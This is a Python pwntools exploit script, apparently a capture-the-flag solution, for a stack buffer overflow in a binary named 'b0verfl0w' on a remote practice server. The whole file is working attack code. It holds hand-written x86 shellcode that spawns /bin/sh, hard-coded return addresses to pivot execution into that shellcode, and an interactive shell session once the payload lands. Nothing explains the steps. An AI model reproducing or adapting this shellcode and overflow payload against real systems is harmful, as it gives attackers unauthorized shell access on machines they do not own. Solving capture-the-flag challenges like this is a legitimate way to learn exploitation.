from pwn import *
context.log_level = 'debug'

# io = process('./b0verfl0w')
io = remote('node4.buuoj.cn', 27901)
elf = ELF('./b0verfl0w')

shell = '\
	push 0x68732f;\
	push 0x6e69622f;\
	mov ebx, esp;\
	push 0x6873;\
	xor ecx, ecx;\
	push ecx;\
	push 4;\
	pop ecx;\
	add ecx, esp;\
	push ecx;\
	mov ecx, esp;\
	xor edx, edx;\
	jmp .1;\
	pop eax;\
	pop eax;\
	pop eax;\
	pop eax;\
	.1:\
'

shell2 = '\
	push 11;\
	pop eax;\
	int 0x80;\
'

shellcode = asm(shell)
io.sendafter(b'name?\n', (p32(0x8048504) + shellcode[:0x20] + p32(0x80484fd) + asm(shell2)).ljust(50, b'a'))
io.interactive()
